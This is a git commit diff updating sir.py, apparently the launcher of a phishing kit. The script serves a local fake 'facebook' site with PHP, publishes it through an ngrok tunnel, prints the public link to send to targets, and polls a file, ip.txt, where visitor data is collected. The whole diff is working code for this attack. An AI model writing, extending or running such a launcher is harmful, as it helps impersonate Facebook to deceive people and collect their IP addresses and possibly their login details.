9df32a7ae8ce5cb5af9a042c9a6193ce3cc5a654
ABIRHOSSAIN10 <84902162+ABIRHOSSAIN10@users.noreply.github.com>
2021-08-23 15:04:21 +0600

    Update sir.py

--- sir.py
+++ sir.py
@@ -1,6 +1,18 @@
-import os
+import os,json,time
+os.system("chmod +x ngrok*")
+os.system("killall ngrok> /dev/null 2>&1 || killall ngrok> /dev/null 2>&1")
 os.system("killall php> /dev/null 2>&1")
 os.system("cd site/facebook/ && php -S 127.0.0.1:8080> /dev/null 2>&1 &")
+os.system("")
+time.sleep(10)
+os.system("curl  http://localhost:4040/api/tunnels > tunnels.json")
+with open('tunnels.json') as data_file:    
+    datajson = json.load(data_file)
+msg = ("Your link is: ")
+for i in datajson['tunnels']:
+    msg = msg + i['public_url']+ '\n'+'Your second link : '
+os.system('clear')
+print (msg)
 while True:
 	if os.path.isfile("site/facebook/ip.txt")==True:
 		tr=open("site/facebook/ip.txt","r")
